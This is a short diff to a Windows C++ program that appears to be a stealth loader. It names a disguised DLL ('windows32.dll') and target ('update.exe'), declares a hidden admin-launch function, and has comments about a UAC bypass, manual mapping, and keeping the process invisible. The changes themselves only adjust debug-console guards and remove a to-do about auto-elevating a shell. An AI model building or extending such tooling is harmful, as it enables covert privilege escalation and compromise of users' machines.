@@ -16,6 +16,8 @@ extern "C" {
     #include "ntstatus.h"
 }
 
+//#define _DEBUG
+
 NTSTATUS StartProcessAsAdmin(LPWSTR lpName, BOOL bHide = TRUE);
 
 #define JOIN(x, y) x ## y
@@ -28,12 +30,6 @@ NTSTATUS StartProcessAsAdmin(LPWSTR lpName, BOOL bHide = TRUE);
 #define     MY_DLL      "windows32.dll"
 #define     MY_TARGET   "update.exe"
 
-///////////////////////////////////////////////////////////////////////////
-//  To do:
-//  Make sure that shell has an auto elevation mechanism in place just in case something happens and it doesn't start as privileged
-///////////////////////////////////////////////////////////////////////////
-
-
 //WinMain is the entry point for windows subsystem (GUI apps) but without initializing the window the process will be hidden graphically
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     _In_opt_ HINSTANCE hPrevInstance,
@@ -44,10 +40,11 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     UNREFERENCED_PARAMETER(lpCmdLine);
 
     //Alloc console for debugging purposes since the manual mapper can't be compiled in debug
-    //AllocConsole();
-    //FILE* f;
-    //freopen_s(&f, "CONOUT$", "w", stdout);
-
+#ifdef _DEBUG
+    AllocConsole();
+    FILE* f;
+    freopen_s(&f, "CONOUT$", "w", stdout);
+#endif
 	//Must be called before calling UAC bypass due to it manipulating/faking executable information
 	auto cwd = GetCWD();
     auto target = (cwd + std::string(MY_TARGET)); //Full path to the target executable
